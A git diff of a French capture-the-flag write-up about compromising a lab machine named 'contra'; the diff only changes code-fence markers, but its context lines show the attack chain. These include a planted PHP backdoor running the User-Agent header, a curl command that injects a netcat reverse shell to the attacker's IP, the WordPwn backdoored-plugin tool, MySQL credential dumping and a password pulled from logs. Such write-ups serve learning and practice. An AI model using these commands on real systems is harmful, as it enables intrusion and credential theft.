@@ -15,7 +15,7 @@ Haut, Haut, Bas, Bas, Gauche, Droite, Gauche, Droite, B, A
 
 Cette machine dispose de trois ports TCP ouverts dont un serveur FTP permettant la connexion anonyme :  
 
-```plain
+```
 21/tcp open  ftp     vsftpd 3.0.3
 |_banner: 220 (vsFTPd 3.0.3)
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -43,7 +43,7 @@ Seulement voilà, on manque de permissions pour éditer le moindre fichier car l
 
 Une solution de rechange est d'uploader un plugin Wordpress contenant une backdoor. Il y a un outil nommé [WordPwn](https://github.com/wetw0rk/malicious-wordpress-plugin) qui peut se charger de ça :  
 
-```plain
+```
 $ python wordpwn.py 10.254.0.29 7777 N
 [*] Checking if msfvenom installed
 [+] msfvenom installed
@@ -77,13 +77,13 @@ Avec un coup de pouce de *tejmal* (un autre participant) je me suis tourné vers
 
 En l’occurrence j'ai utilise le fichier suivant que l'on peut trouver sur Kali Linux :  
 
-```plain
+```
 /usr/share/golismero/wordlist/fuzzdb/Discovery/PredictableRes/raft-large-files.txt
 ```
 
 On découvre alors un fichier *notes.txt* dans la racine web avec le contenu suivant :  
 
-```plain
+```
 /!\ Urgent :Our infrastructure got hacked by some hackers . Everyone must change credentials and please dont download zipped files because  they may be backdoored !
 ```
 
@@ -91,7 +91,7 @@ On enchaîne avec une énumération sur les fichiers zip et sans surprise on tro
 
 J'ai donc utilisé l'un des outils les plus avancés au monde, à savoir grep :p  
 
-```plain
+```
 $ grep -r --include "*.php" passthru blog/
 blog/wp-login.php:passthru($_SERVER['HTTP_USER_AGENT']);  // BOOM backdoor from the Heaven ^^
 ```
@@ -112,7 +112,7 @@ curl -A "nc.traditional -e /bin/bash 10.254.0.29 9999" http://10.1.1.38/blog/wp-
 
 On obtient un shell en tant que *www-data* :  
 
-```plain
+```
 $ ncat -l -p 9999 -v
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::9999
@@ -150,7 +150,7 @@ define('DB_HOST', 'localhost');
 
 Les identifiants MySQL pour le Wordpress laissent supposer en accès restreint mais en fait on peut fouiller dans d'autres bases de données :  
 
-```plain
+```
 mysql> show databases;
 show databases;
 +--------------------+
@@ -168,7 +168,7 @@ show databases;
 
 La base contra nous semblait toute destinée mais les tables étaient vides :  
 
-```plain
+```
 mysql> use contra;
 Database changed
 mysql> show tables;
@@ -184,7 +184,7 @@ show tables;
 
 Quand aux utilisateurs mysql c'est tout comme (donc pas de password reuse en perspective):  
 
-```plain
+```
 mysql> select User, authentication_string from user;
 select User, authentication_string from user;
 +------------------+-------------------------------------------+
@@ -201,7 +201,7 @@ select User, authentication_string from user;
 
 J'ai exécuté LinEnum histoire de détecter des anomalies et quelque chose de particulier m'a mené dans la bonne direction :  
 
-```plain
+```
 [-] World-writable files (excluding /proc and /sys):
 -rwxrwxrwx 1 www-data www-data 174003 Dec 26  2017 /var/www/html/contra.jpg
 -rwxrwxrwx 1 root adm 233 Dec  9 06:25 /var/log/apache2/error.log.14.gz
@@ -223,7 +223,7 @@ Les fichiers de logs d'Apache ne sont normalement pas écrivables, souvent même
 
 Je suis reparti dans la racine web :  
 
-```plain
+```
 www-data@contra:/var/www/html$ ls -l
 total 260
 drwxr-xr-x 2 root     root       4096 Dec 16 15:22 RecoveryUtility
@@ -264,7 +264,7 @@ $conn->close();
 
 C'est encore *grep* qui nous sort de l'embarras :  
 
-```plain
+```
 /var/log/apache2/access.log.1:::1 - - [16/Dec/2018:13:55:42 +0000] "GET /RecoveryUtility/newpass.php?newpassword=Sup3rp@ssw0rd99 HTTP/1.1" 200 463 "-" "curl/7.58.0"
 ```
 
@@ -273,7 +273,7 @@ Game Over
 
 On peut alors se connecter avec le compte bill en SSH. La suite c'est du déjà vu :  
 
-```plain
+```
 bill@contra:~$ sudo -l
 [sudo] password for bill:
 Matching Defaults entries for bill on contra:
